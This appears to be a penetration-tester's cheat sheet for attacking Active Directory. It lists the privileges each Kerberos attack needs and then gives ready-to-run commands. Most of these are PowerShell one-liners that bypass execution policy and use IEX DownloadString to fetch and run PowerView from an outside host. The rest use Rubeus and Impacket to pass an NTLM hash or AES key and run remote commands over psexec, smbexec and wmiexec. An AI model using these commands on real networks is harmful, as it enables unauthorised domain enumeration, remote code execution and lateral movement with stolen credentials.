
### Attack Privilege Requirements
- Kerbrute Enumeration
	- No domain access required 

- Pass the Ticket
	- Access as a user to the domain required

- Kerberoasting
	- Access as any user required

- AS-REP Roasting
	- Access as any user required

- Golden Ticket
	- Full domain compromise (domain admin) required 

- Silver Ticket
	- Service hash required 

- Skeleton Key
	- Full domain compromise (domain admin) required

### Enumeration

PowerView:
- [USER]
	powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-Domain"
	powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainUser"
	powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainUser -SPN"
	powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainUser -Properties 		samaccountname,memberof"
	powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainUser -Properties 		samaccountname,description"

[GROUP]
powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainGroup -Name 'Domain Admins' "
powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1');  Get-DomainGroup | where Name -like "*Admin*" | select SamAccountName "
powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainGroupMember -Name 'Domain admins' "
powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainGroup -Domain 'xor.com'"

[COMPUTER]
powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-NetComputer | select samaccountname, operatingsystem"
powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Get-DomainComputer -Ping "

[SHARED INFO]
powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.140/PowerView.ps1'); Find-DomainShare -Verbose"
cd \\fileshare.pentesting.local\FileShare

### Overass The Hash / Pass The Key

- in PowerShell

	- Rubeus
		- Commands
			- `Rubeus.exe asktgt /domain:$DOMAIN /user:$DOMAIN_USER /rc4:$NTLM_HASH /ptt`
		- [Rubeus](https://github.com/GhostPack/Rubeus)

	- PsExec
		- Commands
			- `PsExec.exe -accepteula \\$REMOTE_HOSTNAME cmd`

- in Kali Linux

	- Impacket
		- Commands
			- with Hash
				- `getTGT.py $DOMAIN/$DOMAIN_USER -hashes [lm_hash]:$NTLM_HASH`
			- with aesKey
				- `getTGT.py $DOMAIN/$DOMAIN_USER -aesKey $AES_KEY`
			- with Password
				- `getTGT.py $DOMAIN/$DOMAIN_USER:$PASSWORD`
			- Set TGT for impacket use
				- `export KRB5CCNAME=<TGT_ccache_file>`
			- Execute remote commands
				- `psexec.py $DOMAIN/$DOMAIN_USER@$REMOTE_HOSTNAME -k -no-pass`
				- `smbexec.py $DOMAIN/$DOMAIN_USER@$REMOTE_HOSTNAME -k -no-pass`
				- `wmiexec.py $DOMAIN/$DOMAIN_USER@$REMOTE_HOSTNAME -k -no-pass`
		- [Impacket](https://github.com/SecureAuthCorp/impacket/releases/)
